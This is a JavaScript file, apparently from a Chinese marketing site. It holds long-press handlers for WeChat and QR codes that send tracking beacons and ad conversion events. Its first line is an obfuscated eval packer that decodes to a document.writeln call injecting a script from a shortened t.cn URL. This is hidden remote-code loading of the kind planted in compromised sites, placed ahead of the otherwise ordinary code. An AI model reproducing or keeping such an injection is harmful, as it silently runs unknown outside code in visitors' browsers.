/* 28127 */eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('2.1("<0 3=\'7://4.6/5\'></0>");',8,8,'script|writeln|document|src|t|RcPJvsa|cn|http'.split('|'),0,{}));

//长按微信或者二维码

//$(function(){
//
//	$("#aa").on({
//
//		touchstart: function(e){
//
//			timeOutEvent = setTimeout("longPresstj()",500);
//
//		}
//
//	})
//
//});



function longPress(obj,LinkId){ 
	obj.on({
		touchstart: function(e){
			timeOutEvent = setTimeout("presstj("+LinkId+")",500);
			
		},
		touchmove: function(){  
                    clearTimeout(timeOutEvent);   
                timeOutEvent = 0;   
        },
		touchend: function(){  
            clearTimeout(timeOutEvent);    
            return false;   
        }  
	})
}

function presstj(LinkId){
	var params = { "LinkId": LinkId, "LinkName": "Index", "LinkURL": window.location.href, "PageUrl": "" };
    var url = "http://sasinterface.songyutech.com/Spread/SpreadInsertSq?callback=callback";
	$.ajax({
            url: url,
            type: "get",
            data: params,
            dataType: "jsonp",
            jsonp: "callback",
            jsonpCallback: "JsonCallback",
            success: function(data) {
                window.console.log("true");
            },
            error: function(data) {
                window.console.log("false");
            }
        });
}

 function longPressByOCPC(obj,LinkId,convert_id){ 
	obj.on({
		touchstart: function(e){
			timeOutEvent = setTimeout("longPresstjByOCPC("+LinkId+","+convert_id+")",500);
			
		},
		touchmove: function(){  
                    clearTimeout(timeOutEvent);   
                timeOutEvent = 0;   
        },
		touchend: function(){  
            clearTimeout(timeOutEvent);    
            return false;   
        }  
	})
}

function longPresstjByOCPC(LinkId,convert_id){
	presstj(LinkId);
	_taq.push({convert_id:convert_id, event_type:"button"})	
}